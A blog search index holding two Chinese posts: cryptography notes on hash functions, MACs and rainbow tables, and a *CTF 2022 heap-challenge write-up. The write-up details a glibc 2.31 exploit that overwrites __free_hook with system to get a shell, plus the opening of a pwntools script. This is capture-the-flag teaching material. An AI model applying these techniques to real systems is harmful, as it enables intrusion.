<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>密码学基础 Chapter 4——Hash函数</title>
      <link href="/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-4%E2%80%94%E2%80%94Hash%E5%87%BD%E6%95%B0/"/>
      <url>/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-4%E2%80%94%E2%80%94Hash%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="4-1-数据完整性"><a href="#4-1-数据完整性" class="headerlink" title="4.1 数据完整性"></a>4.1 数据完整性</h1><p>信息安全的三个要点：机密性、完整性、可用性<br>被动攻击：攻击者只能监听；主动攻击：攻击者可能会干扰通信</p><ul><li>数据完整性是对抗对消息未授权修改的安全服务</li><li>有些应用不需要机密性<br>解决完整性问题：添加冗余</li><li>对称技术：Hash函数（散列函数），报文鉴别码（MAC）</li><li>非对称技术：数字签名</li></ul><h2 id="Hash函数"><a href="#Hash函数" class="headerlink" title="Hash函数"></a>Hash函数</h2><p>H(M)作用于一个任意长度的消息M，返回固定长度（通常超过128比特）的散列值h：<br>h&#x3D;H(M)</p><ul><li>有时也称为摘要函数、散列函数或杂凑函数</li><li>h也被称为消息或数据的“摘要”或“指纹”</li><li>带密钥的Hash函数：可以将h和M一起在不安全的信道中传输</li><li>不带密钥的Hash函数：h必须安全存放以保证h不被篡改</li></ul><p>作用：</p><ul><li>口令保护</li><li>构造报文鉴别码HMAC</li><li>数字签名</li><li>伪随机数生成器</li></ul><p>要求：</p><ul><li>快速：给定M，很容易计算h</li><li>单向：给定h，根据H(M)&#x3D;h无法计算出M</li><li>防碰撞：给定M，要找到另一条消息M’并满足二者摘要相等困难或找到任意两个具有相同散列值的不同消息困难</li></ul><p>假定h：X→Y，|X|≥|Y|，设x∈X，定义y&#x3D;h(x)</p><ul><li>单向性（原像稳固性）：给定摘要y，找到x使得h(x)&#x3D;y困难</li><li>第二原像稳固性：给定消息x∈X，找到一个x’∈X且x’≠x，使得h(x)&#x3D;h(x’)困难</li><li>碰撞稳固性：对于任意x，x’∈X，找到x≠x’且h(x)&#x3D;h(x’)的二元组(x，x’)困难</li></ul><p>理想的Hash函数应该满足：对于给定的x，只能通过函数h计算得到h(x)的值，而无法通过其他条件得到；已知h(x<del>1</del>)，h(x<del>2</del>)，…，无法间接推出h(x)，其中x与x<del>1</del>，x<del>2</del>，…均不相等</p><h2 id="随机预言机ROM"><a href="#随机预言机ROM" class="headerlink" title="随机预言机ROM"></a>随机预言机ROM</h2><ul><li>提供“理想”Hash函数的数学模型</li><li>确定性、有效性和均匀输出</li></ul><p>令$F^{X,Y}$是所有从X到Y的函数集合，假定|X|&#x3D;N，|Y|&#x3D;M，随机从$F^{X,Y}$中选择一个Hash函数h：X→Y，对于任意的输入x，其输出值为均匀的，计算h(x)的唯一方法是询问随机预言机。</p><p>定理：假定$h\in F^{X,Y}$随机选择，令$X_0\in X$，假定当且仅当$x\in X_0$时。h(x)被确定，则对所有的$x\in X \backslash X_0,y\in Y$都有$Pr[h(x)&#x3D;y]&#x3D;\frac{1}{M}$</p><h2 id="原像问题"><a href="#原像问题" class="headerlink" title="原像问题"></a>原像问题</h2><p>Find - Preimage(h, y, Q)<br>选择任意的$X_0\subseteq X,|X_0|&#x3D;Q$<br>for each x∈X<del>0</del><br>do: if h(x)&#x3D;y then return(x)<br>return (failure)</p><p>对于任意的$X_0\subseteq X,|X_0|&#x3D;Q$，算法的平均成功率为$\varepsilon&#x3D;1-(1-\frac{1}{M})^{Q}$</p><p>证明：给定y∈Y，令X<del>0</del>&#x3D;{x<del>1</del>，x<del>2</del>，…，x<del>Q</del>}<br>对于1≤i≤Q，有$Pr[E_i]&#x3D;\frac{1}{M}$<br>则有$Pr[E_1 \vee E_2 \vee … \vee E_Q]&#x3D;1-(1-\frac{1}{M})^Q$<br>对于任意给定的y的成功率是常数，故结论成立。Q远小于M，故$\varepsilon\approx\frac{Q}{M}$（舍弃了后面的M^-1^的高次项）</p><h2 id="第二原像问题"><a href="#第二原像问题" class="headerlink" title="第二原像问题"></a>第二原像问题</h2><p><strong>拉斯维加斯算法</strong><br>Find - Second - Preimage(h, y, Q)<br>y&#x3D;h(x)<br>选择$X_0\subseteq X\backslash{x},|X_0|&#x3D;Q-1$<br>for each x<del>0</del>∈X<del>0</del><br>do: if h(x<del>0</del>)&#x3D;y then return(x<del>0</del>)<br>return failure</p><p>对于任意的$X_0\subseteq X\backslash{x},|X_0|&#x3D;Q-1$，算法的成功率为$\varepsilon&#x3D;1-(1-\frac{1}{M})^{Q-1}$</p><h2 id="碰撞问题"><a href="#碰撞问题" class="headerlink" title="碰撞问题"></a>碰撞问题</h2><p><strong><font color=red>生日攻击</font></strong><br>Find - Collision(h, Q)<br>选择任意的$X_0\subseteq X,|X_0|&#x3D;Q$<br>for each x∈X<del>0</del><br>do y<del>x</del>&#x3D;h(x)<br>if 对某一x’∈X，有y<del>x</del>&#x3D;y<del>x’</del><br>then return (x,x’)<br>else return (failure)</p><p>对于任意的$X_0\subseteq X,|X_0|&#x3D;Q$，算法平均成功率为<br>$$\varepsilon&#x3D;1-(\frac{M-1}{M}\frac{M-2}{M}…\frac{M-Q+1}{M})$$<br>$$Q\approx\sqrt{2M\ln\frac{1}{1-\varepsilon}}$$</p><p>证明：<br>$$\varepsilon&#x3D;1-(\frac{M-1}{M}\frac{M-2}{M}…\frac{M-Q+1}{M})\<br>\approx\prod_{i&#x3D;1}^{k-1}e^{-\frac{i}{M}}&#x3D;e^{-\frac{k(k-1)}{2M}}$$</p><p><font color=red>对一个输出空间大小为M的随机函数，只需要计算大约$\sqrt{M}$个函数值就能够以一个不可忽略的概率发现一个碰撞。因此Hash函数的输出空间大小必须有一个下界。</font></p><h2 id="安全性准则的比较"><a href="#安全性准则的比较" class="headerlink" title="安全性准则的比较"></a>安全性准则的比较</h2><p>Collision - To - Second - Preimage(h)<br>external Oracle - 2nd - Preimage<br>均匀随机选择x∈X<br>if Oracle - 2nd - Preimage(h,x)&#x3D;x’<br>then return (x,x’)<br>else return (failure)</p><p>碰撞问题可以归约到第二原像问题，因此可以说碰撞稳固性质意味着第二原像稳固性质。</p><p>Collision - To - Preimage(h)<br>external Oracle - Preimage<br>均匀随机选择x∈X<br>y←h(x)<br>if (Oracle - Preimage(h, y)&#x3D;x’) and (x≠x’)<br>then return (x, x’)<br>else return (failure)</p><p>定理4.5 假定h: X→Y是一个Hash函数，其中|X|和|Y|有限且|X|≥2|Y|。假定Oracle - Preimage对固定的hash函数是原像问题中的一个(1, Q)算法，则Collision - To - Preimage对固定的Hash函数时碰撞问题的一个(1&#x2F;2, Q+1)算法</p><p><strong>使用随机预言机模型中理想Hash函数是困难的，可以参考一些分组密码理论构造尽可能接近理想特性的Hash函数。（混乱、扩散、随机）</strong>。可以基于数学难题构造方法，但计算速度慢，不实用。因此可以使用对称密码体制来设计Hash函数，或者直接设计。</p><h1 id="4-2-常用Hash函数"><a href="#4-2-常用Hash函数" class="headerlink" title="4.2 常用Hash函数"></a>4.2 常用Hash函数</h1><p>Hash函数通用结构：迭代结构</p><h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><h3 id="填充"><a href="#填充" class="headerlink" title="填充"></a>填充</h3><p>最后一块的最后8个字节（64bits）保存的是输入的长度。如果消息正好是分块的整数倍，仍然需要填充一整块，其中前面为10000…（填充内容），后面为输入长度。如果消息过长（大于2^64 bits），则将消息模2^64（仅取低64位）计算MD5。（消息长度为小端序）</p><h3 id="压缩初始化"><a href="#压缩初始化" class="headerlink" title="压缩初始化"></a>压缩初始化</h3><p>初始化4个字寄存器，填入CV<del>0</del>（0x67452301，0xEFCDAB89，0x98BADCFE，0x10325476，固定不变）</p><h3 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h3><p><img src="https://img-blog.csdnimg.cn/5c02205ea8124707a8b829cd44f5acc5.jpeg"><br>$$F(B,C,D)&#x3D;(B\land C)\vee(\lnot B\land D)\<br>G(B,C,D)&#x3D;(B\land C)\vee(C\land\lnot D)\<br>H(B,C,D)&#x3D;B\oplus C\oplus D\<br>I(B,C,D)&#x3D;C\oplus(B\vee\lnot D)$$</p><h2 id="SHA1"><a href="#SHA1" class="headerlink" title="SHA1"></a>SHA1</h2><h3 id="填充-1"><a href="#填充-1" class="headerlink" title="填充"></a>填充</h3><p>与MD5基本相同，不同的是SHA1最后的输入长度为<strong>大端序</strong>而MD5为小端序</p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>一共执行80步后输出<br><img src="https://img-blog.csdnimg.cn/9ff6ceb6be5e44ea9d3cb3bcb07541a7.jpeg"><br>$$F_1&#x3D;(B\land C)\vee(\lnot B\land D)\<br>F_2&#x3D;B\oplus C\oplus D\<br>F_3&#x3D;(B\land C)\vee(B\land D)\vee(C\land D)$$<br>其中F<del>1</del>用于第0-19步，F<del>2</del>用于第20-39、60-79步，F<del>3</del>用于第40-59步</p><p>$$W_t&#x3D;\left{\<br>\begin{array}{c}<br>Y_i[t], 0\le t\le 15\<br>S^1(W_{t-16}\oplus W_{t-14}\oplus W_{t-8}\oplus W_{t-3})，t\ge 15<br>\end{array}<br>\right.$$</p><p>$$K_t&#x3D;\left{\<br>\begin{array}{c}<br>\operatorname{0x}5A827999, 0\le t\le 19\<br>\operatorname{0x}6ED9EBA1, 20\le t\le 39\<br>\operatorname{0x}8F1BBCDC, 40\le t\le 59\<br>\operatorname{0x}CA62C1D6, 60\le t\le 79\<br>\end{array}<br>\right.$$</p><h2 id="二者比较"><a href="#二者比较" class="headerlink" title="二者比较"></a>二者比较</h2><p>摘要长度：寻找原像与碰撞<br>速度：SHA1速度慢于MD5<br>简洁与紧致性：描述和实现都较为简单，无需更大代换表<br>数据存储方式：小端序和大端序<br>安全性：SHA1优于MD5</p><h2 id="SM3"><a href="#SM3" class="headerlink" title="SM3"></a>SM3</h2><ul><li>遵循通用迭代结构</li><li>输出为256比特的摘要，消息长度小于2^64^，按照512比特分组</li><li>过程包括填充和迭代压缩，填充方式与MD5相同</li><li>压缩函数使用8个字寄存器，大端序存储，同SHA1，一共执行64步</li><li>输出为160bit</li></ul><p><img src="https://img-blog.csdnimg.cn/d8d7045778594a629394835bd3fade4f.jpeg"><br>压缩函数：将Y<del>i</del>扩展为132个字用于压缩函数CF（ABCDEFGH）<br><img src="https://img-blog.csdnimg.cn/d5d7ad7ca4c94e8098afe1eb7ec511fa.jpeg"><br><img src="https://img-blog.csdnimg.cn/6ee742c19b8b4d2280f9918e3d5a5639.jpeg"></p><h2 id="SHA3"><a href="#SHA3" class="headerlink" title="SHA3"></a>SHA3</h2><p>采用海绵结构，可以实现任意长度的输入和输出<br><img src="https://img-blog.csdnimg.cn/01879eddd7944f708d621d67f27eaa70.jpeg"></p><h3 id="填充-2"><a href="#填充-2" class="headerlink" title="填充"></a>填充</h3><p>首尾填充1，中间填充0，整数倍也要填充</p><p>$\forall n\ge 0,\forall M,M’\in(Z_2)^*:M\ne M’\Rightarrow M||pad[r]\ne M’||pad[r]||0^{nr}$<br>即若原来的明文不一样，填充完之后应该也不一样。<br><img src="https://img-blog.csdnimg.cn/7bf1fcee139d463eaa398f8376b49bd4.jpeg"><br><img src="https://img-blog.csdnimg.cn/4a77fdafdedf4a4abc67b859b858d61a.jpeg"><br><img src="https://img-blog.csdnimg.cn/17ff061b1fe84339affa624aabcfbbfd.jpeg"><br><img src="https://img-blog.csdnimg.cn/6de81aa60bf449aa8995e298efa93889.jpeg"><br><img src="https://img-blog.csdnimg.cn/450696ea714f4cf982e47753a9c07e35.jpeg"><br><img src="https://img-blog.csdnimg.cn/418025d8c0ec4bf4b5a5f129e723c9c5.jpeg"></p><h2 id="MAC"><a href="#MAC" class="headerlink" title="MAC"></a>MAC</h2><p>报文校验码，满足某些安全性质的带密钥的Hash函数，功能是保证数据完整性以及数据源认证<br>可以通过不带密钥的Hash函数构造：HMAC<br>也可通过对称密钥算法构造：CBC-MAC</p><p>ipad &#x3D; 3636…36<br>opad &#x3D; 5c5c…5c</p><p>HMAC<del>K</del>(x)&#x3D;SHA-1((K$\oplus$opad)||SHA-1((K$\oplus$ipad)||x))【||表示连接】<br>通过嵌套Hash函数以保证MAC的安全性。一旦结构安全，则可以替换其中的Hash函数</p><p>CBC-MAC(x,k)<br>令x&#x3D;x<del>1</del>||…||x<del>n</del><br>IV←00…0<br>y<del>0</del>←IV<br>for i&#x3D;1 to n<br>do y<del>i</del>&#x3D;e<del>k</del>(y<del>i-1</del>$\oplus$x<del>i</del>)<br>return y<del>n</del><br>加密算法具有混乱特性，当基本加密算法满足合适的安全性质时，CBC-MAC是安全的</p><p>CCM模式：CTR+CBC-MAC<br>T<del>i</del>&#x3D;ctr+i mod 2^m^，x&#x3D;x<del>1</del>||…，y<del>i</del>&#x3D;e<del>k</del>(T<del>i</del>)$\oplus$x<del>i</del><br>temp &#x3D; CBC-MAC(x, K)，y’ &#x3D; T<del>0</del>$\oplus$temp，y&#x3D;y<del>1</del>||y<del>2</del>||…||y’</p><p><strong>攻击方式</strong>：</p><ul><li>暴力破解</li><li>字典攻击（针对于口令）</li><li>彩虹表<br>对随机口令取哈希值，再通过一个从Hash值空间到口令空间均匀分布的函数R，获取到这个口令Hash取函数R后的另一个口令。如此进行下去可以获取到一个口令-Hash-口令-Hash-……的链，可以获取多个这样的链，在存储时只需要存储每条链的第一个和最后一个口令即可，可以大大节省存储空间。<br>如果哈希值为H的口令不是P<del>i,j</del>中的任何一个，那么在这条链上一定找不到<br>如果彩虹表链长上界为n，若Hash值为H<del>0</del>的口令是P<del>i,j</del>中的某一个，最多n次运算后能够使得P<del>i</del>等于彩虹表中某条链的链尾<br>为了防止不同链的碰撞，需要使用多个R函数<br>Cain，RainbowCrack等免费使用的公用彩虹表，但主流支持10字符一下的口令。采用salt（盐值）能够有效对抗彩虹表</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>_CTF-2022 examination 题解</title>
      <link href="/2023/02/28/starCTF-2022-examination-%E9%A2%98%E8%A7%A3/"/>
      <url>/2023/02/28/starCTF-2022-examination-%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>源文件：<a href="https://github.com/Hornos3/pwnfile">my_github</a></p><p>这是一道堆题，模拟了学生和老师的有趣生活。</p><p>在这里，老师能干的事情有：添加学生、评分（分数随机，通常不超过10分）、为某一个学生写评语、叫家长（删除学生）。学生能干的事情有：做题（在本赛题中没有用）、查看评语、祈祷、设置模式（在本赛题中没有用）、修改要操作的学号。其中学生祈祷后，老师评分时能够发现，并吐槽一下，额外减10分。如果学生查看自己的分数发现大于89分，则可以获得奖励：获取到该学生信息的堆块地址，以及对任意地址的值加1（这种奖励每位学生只能获得一次）。</p><p>首先，我们需要发现一个整型漏洞。注意到祈祷之后评分会额外扣10分，如果本来没有10分，扣除之后就成了负数。看一下汇编，这里的跳转指令用的是jbe，也就是无符号整数的比较，这样就形成了一个整型漏洞。扣这10分之后，我们就可以进行任一地址加1的操作了。这是本题中最为关键的操作，没有之一。</p><p><img src="https://img-blog.csdnimg.cn/7ab5d28b0cb34cb0876b8a57be36c69c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>在本题中，首先我们要获取libc的加载地址，好定位system函数。由于本题使用的glibc版本为2.31，因此任何小于0x400的chunk在释放时都会被存储到tcache中，而tcache chunk中并不包含任何glibc的偏移地址。这样，我们是无法知道glibc的偏移的。要想获得glibc地址，我们需要让一个chunk进入unsorted bin。这就需要使这个chunk的大小超过0x400。我们手中能用的手段只有任一地址加1，因此顺理成章地我们可以将这里的地址改大为0x500，这样就能够获得一个unsorted bin chunk了。</p><p>但是，如果仅仅是单纯地这样修改，我们仍然无法对这个chunk进行有效地控制。因为free意味着删除学生，程序中删除学生会将对应位置的悬挂指针清零，使我们看上去失去了UAF的可能性。但是别忘了，任一地址加1也是一个很好的攻击武器。如果我们通过任意地址加1能够修改一个学生评语的指针，那会怎么样呢？我们可以让两个学生的评语指向同一个位置，这样就实现了UAF。</p><p>经过实际验证，发现本程序中有很多需要注意的细节问题，需要把握好这些细节才能够拿到shell，否则程序容易崩溃退出。</p><p><strong>1. 学生数量问题</strong></p><p><img src="https://img-blog.csdnimg.cn/46fcd1a1c830478d8ed72bda9505b35d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>从添加学生的程序中看出，学生最多只能有7个，而删除学生能够让计数器减1。</p><p><strong>2. 评分问题</strong></p><p><img src="https://img-blog.csdnimg.cn/644448d3bdcf41e1a19005d7ca2069ba.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>在评分的函数中，我们发现了一个程序bug。</p><p>假如我们现在已经有了7名学生，删除第1名学生，其指针会变成空指针，计数器的值应为6。但是评分遍历时还是会遍历到第1名学生，就会导致段错误。为了防止这种情况的发生，我们每一次删除一名学生都必须删除最后一名学生。</p><p><strong>3. 地址写</strong></p><p><img src="https://img-blog.csdnimg.cn/46aa8f0bd0dd40cda20a199e969ad3b8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>在任意地址写程序中，我们需要输入一个地址的10进制数。但是出题人在处理这个10进制数的时候没有处理好。本来read函数读取到换行结束，出题人应该是想把换行改成空字符，但是很不巧的是他改错了，将最后一位数字改成了空字符。这就需要我们每一次输入地址的时候都要在后面多输入一位无效数字，在比赛的时候这个小bug造成了一些不必要的时间浪费。<del>（屑出题人）</del></p><p><strong>4. calloc</strong></p><p>本题中除了teacher端输入6调用了一个malloc之外，其他的内存分配均使用calloc，而calloc不会分配tcache中的chunk。</p><p>注意到上面的限制条件之后，我们可以对步骤细化：</p><p>Step 1: 构造学生4的评语在学生5、6评语之后，绕过删除评语5的检查<br>Step 2: 奖励学生4，将学生5、6的评语（原大小：0x400）指向同一位置<br>Step 3: 奖励学生6，使学生6评语大小改大0x100（利用学生6的奖励机会）<br>Step 4: 删除学生6<br>Step 5: 读取学生5评语获取libc地址<br>Step 6: 将学生6添加回来<br>Step 7: 用学生5覆写学生6的chunk指针到__free_hook<br>Step 8: 为学生6写评语’&#x2F;bin&#x2F;sh’<br>Step 9: 在__free_hook写入system地址<br>Step 10: 用学生5覆写学生6的chunk指针返回到原来的位置<br>Step 11: 删除学生6，getshell</p><p>这里需要明确一点：在glibc 2.31的地盘，想要分配一个chunk到__free_hook是一件很难的事情。因为在分配前会对目标地址进行一系列的检查，具体参见我的how2heap学习第9篇文章。由于本题使用calloc作为内存分配函数，因此将tcache指针指向__free_hook也是无效的。因此，本题需要转换思路，直接修改写入评语的地址到__free_hook，即上述第7步。</p><p>在上面的思路中，第10步运用了calloc函数的特性，需要我们对本程序堆内存的分配情况有充分的了解，下面进行解释：</p><p>在bss段有一个长度为7的数组，存放学生信息的chunk指针，为描述方便，将这个数组中指针指向的chunk称为pointer chunk。每一个pointer chunk的大小均为0x30，其中只保存一个堆chunk指针，这个chunk指针指向的chunk保存的是该学生的分数、是否已经领取奖励的标志位、评语的chunk（以下称comment chunk）、评语chunk的长度等信息，大小为0x20，称其为header chunk（实际分配为0x18，最后8字节与后一个chunk的prev_size重合）。由于每一次添加学生时，两个chunk先后被分配，因此在一开始，不妨将7个学生均分配一次，这样堆空间中就会存在7个这样的结构：</p><p><img src="https://img-blog.csdnimg.cn/47570d12b0f440b0a78f2908179aa23d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>在后面，是我们申请的评语的chunk，一开始我们会申请3个评语chunk，大小分别为0x100,0x400,0x200，分别给学生5,6,4。其中学生5分配0x100是为了后续步骤中将学生5的评语指针修改至与学生6重合。</p><p><img src="https://img-blog.csdnimg.cn/03b237767d3c464f992de8ce5e32d9f8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_16,color_FFFFFF,t_70,g_se,x_16"></p><p>由于在后期将学生6的chunk size改大0x100后需要free，因此在学生4的comment chunk中需要进行一定的构造以绕过检查。在学生4的comment chunk对应位置构造假chunk，这个假chunk头应该在学生6的comment chunk扩大0x100后其尾部的正后方，也即学生4 comment chunk头部向后偏移0x100处，构造如下内容：</p><p><img src="https://img-blog.csdnimg.cn/c15c37fbb0ae4c859c665d8bc09d5671.png"></p><p>这两个假chunk可用于绕过_int_free函数的检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 4316</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;double free or corruption (!prev)&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// line 4320</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize_nomask (nextchunk) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): invalid next size (normal)&quot;</span>);</span><br></pre></td></tr></table></figure><p>在此之后，将学生5的comment chunk指针改到学生6的comment chunk可写头部，将学生6的comment chunk改大0x100后释放。</p><p><img src="https://img-blog.csdnimg.cn/692219559d174410aaa772e7f3829ae4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>此时，我们使用stu5的指针可以获取到stu6 comment chunk的libc地址，因为此时这个chunk大小为0x500，在unsorted bin中。<br>之后将stu6申请回来，由于calloc不会使用tcache，因此在comment chunks上方被释放到tcache中原stu6的pointer chunk和header chunk均不会被分配出来，而是会对stu6的comment chunk进行切割，从而也就能够使我们能通过stu5的指针对stu6的信息进行随意改写。我们先对stu6写评语：’&#x2F;bin&#x2F;sh’，这个地址我们可以得到，就在stu6的header chunk之上，我们首先将计算得到的__free_hook地址写到stu6的header chunk中存放comment chunk指针的地方，这样可以在对stu6写评语时直接修改__free_hook的值。然后再对stu5写评语将stu6的comment chunk指针改回到原先写有’&#x2F;bin&#x2F;sh’的地方，再执行free函数即可getshell。</p><p><img src="https://img-blog.csdnimg.cn/1f3e82a26750457180542a5bf83c59f3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./examination&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">students = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">reviews = [<span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>]</span><br><span class="line">chunk_addr = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">scores = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">current_role = <span class="number">0</span></span><br><span class="line">current_sid = <span class="number">0</span></span><br><span class="line">student_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_student</span>(<span class="params">q</span>):</span><br><span class="line"><span class="keyword">global</span> student_num</span><br><span class="line"><span class="keyword">assert</span>(current_role == <span class="number">0</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;enter the number of questions: &#x27;</span>, <span class="built_in">str</span>(q).encode())</span><br><span class="line">students[student_num] = <span class="number">1</span></span><br><span class="line">chunk_addr[student_num] = <span class="string">&#x27;unknown&#x27;</span></span><br><span class="line">student_num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">give_score</span>():</span><br><span class="line"><span class="keyword">assert</span>(current_role == <span class="number">0</span>)</span><br><span class="line">io.sendlineafter(<span 